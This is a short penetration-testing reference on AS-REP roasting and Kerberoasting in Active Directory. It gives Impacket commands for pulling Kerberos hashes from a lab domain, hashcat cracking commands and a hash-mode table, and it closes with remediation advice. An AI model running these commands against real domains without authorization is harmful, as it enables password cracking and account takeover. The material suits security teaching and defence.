# AS-REP roasting and Kerberoasting

Two offline-cracking attacks against Kerberos. Both end the same way: you get a
hash, you take it to hashcat, and weak passwords fall. The difference is what you
need to start.

## AS-REP roasting

Targets accounts with **"Do not require Kerberos pre-authentication"** set. For
those, anyone can ask the DC for an AS-REP and get back material encrypted with
the account's password — no valid creds needed. So it's often the very first
thing worth trying.

```bash
# with a user list, no creds required
GetNPUsers.py test.local/ -usersfile users.txt -no-pass -format hashcat \
  -dc-ip 100.64.5.10 -outputfile asrep.hash

# or, if you already have any valid login, let it find them for you
GetNPUsers.py test.local/j.admin:'<redacted>' -request -format hashcat
```

The hash looks like `$krb5asrep$23$user@TEST.LOCAL:...`. That's hashcat mode
**18200**.

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

## Kerberoasting

Targets **service accounts** — anything with an SPN. Any authenticated user can
request a service ticket (TGS) for an SPN, and the ticket is encrypted with the
service account's password. Service accounts tend to have old, human-set
passwords and are often over-privileged, which is what makes this the fast path
on a lot of domains.

```bash
# needs any valid domain creds
GetUserSPNs.py test.local/j.admin:'<redacted>' -request -dc-ip 100.64.5.10 \
  -outputfile kerb.hash
```

Hash is `$krb5tgs$23$...`, hashcat mode **13100**.

```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

## Why this works at all

Both rely on an account's password being crackable offline. RC4 (`etype 23`)
tickets are the easy ones. If the domain forces AES (`etype 17/18`) the hashes
are much slower to crack — worth checking the etype before you burn GPU hours,
because an AES-only domain changes the economics.

## hashcat mode cheat-sheet (the ones I actually use)

| What | Mode |
|------|------|
| AS-REP (krb5asrep, RC4) | 18200 |
| Kerberoast (krb5tgs, RC4) | 13100 |
| NTLM | 1000 |
| NetNTLMv1 | 5500 |
| NetNTLMv2 | 5600 |

## Fixing it (short version)

- Service accounts: long random passwords (gMSA where possible — 120+ char,
  rotated automatically, basically un-roastable), and no SPNs on normal users.
- Turn off "do not require pre-auth" unless something genuinely needs it.
- Force AES and retire RC4.
